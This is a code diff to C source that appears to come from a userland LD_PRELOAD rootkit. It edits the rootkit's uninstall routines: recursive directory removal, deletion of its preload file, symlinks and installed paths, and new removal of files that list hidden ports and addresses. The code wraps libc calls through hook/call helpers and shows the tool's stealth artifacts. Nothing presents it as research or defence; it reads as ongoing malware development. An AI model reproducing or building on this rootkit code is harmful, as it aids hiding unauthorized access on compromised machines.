@@ -3,7 +3,7 @@ void eradicatedir(const char *target){
     struct dirent *dir;
     struct stat pathstat;
 
-    hook(COPENDIR, CREADDIR, CUNLINK, CRMDIR, C__XSTAT);
+    hook(COPENDIR, CREADDIR, CRMDIR, C__XSTAT);
 
     dp = call(COPENDIR, target);
     if(dp == NULL) return;
@@ -20,7 +20,7 @@ void eradicatedir(const char *target){
             if(S_ISDIR(pathstat.st_mode))
                 eradicatedir(path); // we recursive.
 
-        if((long)call(CUNLINK, path) < 0 && errno != ENOENT)
+        if(rm(path) < 0)
             printf("Failed unlink on %s\n", path);
     }
     closedir(dp);
@@ -34,7 +34,7 @@ void uninstallass(void){
     struct stat assstat, assdirstat;
     gid_t magicgid;
 
-    hook(CFOPEN, C__XSTAT, CUNLINK);
+    hook(CFOPEN, C__XSTAT);
 
     fp = call(CFOPEN, ASS_PATH, "r");
 
@@ -53,7 +53,7 @@ void uninstallass(void){
                 continue;
 
             if(!S_ISDIR(assstat.st_mode))
-                call(CUNLINK, line);
+                rm(line);
             else
                 eradicatedir(line);
 
@@ -99,11 +99,8 @@ void uninstallbdv(void){
     preloadpath = PRELOAD_FILE;
 #endif
 
-    hook(CUNLINK);
-
     printf("Removing preload file\n");
-    ulr = (long)call(CUNLINK, preloadpath);
-    if(ulr < 0 && errno != ENOENT)
+    if(rm(preloadpath) < 0)
         printf("Failed removing preload file\n");
 
     printf("Removing symlink sources\n");
@@ -111,10 +108,10 @@ void uninstallbdv(void){
         src = linksrcs[i];
         dest = linkdests[i];
 
-        ulr = (long)call(CUNLINK, src);
+        ulr = rm(src);
         if(ulr < 0 && errno == EISDIR)
             eradicatedir(src);
-        else if(ulr < 0 && errno != ENOENT)
+        else if(ulr < 0)
             printf("Failed removing %s (%s)\n", src, basename(dest));
     }
 
@@ -126,10 +123,17 @@ void uninstallbdv(void){
             continue;
         }
 
-        ulr = (long)call(CUNLINK, bdvpaths[i]);
-        if(ulr < 0 && errno != ENOENT)
+        if(rm(bdvpaths[i]) < 0)
             printf("Failed removing %s\n", bdvpaths[i]);
     }
+#ifdef HIDE_PORTS
+    if(rm(HIDEPORTS) < 0)
+        printf("Failed removing hide_ports\n");
+#endif
+#ifdef HIDE_ADDRS
+    if(rm(HIDEADDRS) < 0)
+        printf("Failed removing hide_addrs\n");
+#endif
 
     printf("Done.\n");
 }
